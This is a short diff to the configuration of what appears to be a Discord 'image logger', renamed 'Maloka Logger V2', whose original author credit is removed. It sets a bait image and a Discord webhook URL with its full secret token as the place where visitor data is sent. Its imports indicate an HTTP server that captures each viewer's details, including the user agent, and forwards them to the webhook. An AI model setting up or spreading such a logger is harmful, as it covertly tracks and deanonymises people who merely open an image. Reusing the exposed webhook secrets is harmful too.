@@ -1,6 +1,3 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -12,12 +9,12 @@ __author__ = "YoshiDevs"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1094631322967875594/u8_J8TI5ApP05RAnYetodlTLo33g6TkHxW_IPGlnDFJM3ATI9U-drYWr-_Sg9zghbXve",
-    "image": "https://i.imgur.com/AD3MbBi.jpeg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1094334971155587192/inUax9d-7gYx29RAQXRR9_GCK3R27Yl6TJIFZxv3S3hDIZUqOy_HFQc5Sp8wQRSC2KCN",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSTFHmHZlxahwpSkGykiZX0lNwF8AJ9LLFMqw&usqp=CAU", # You can also have a custom image by using a URL
     "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Maloka Logger", # Set this to the name you want the webhook to have
+    "username": "Maloka Logger V2", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
